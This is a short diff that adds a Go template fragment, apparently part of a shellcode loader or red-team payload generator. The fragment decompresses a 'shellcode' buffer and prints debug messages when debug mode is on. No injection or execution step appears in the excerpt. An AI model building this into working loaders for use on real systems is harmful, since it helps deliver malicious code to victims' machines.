@@ -1,0 +1,11 @@
+{{if .Debug}}
+printDebug("info","Unzip payload data")
+{{end}}
+shellcode, errZip := unzip(shellcode)
+
+if errZip != nil {
+	{{if .Debug}}
+	printDebug("error","Unzip function error: %s", errZip)
+	{{end}}
+	return
+}
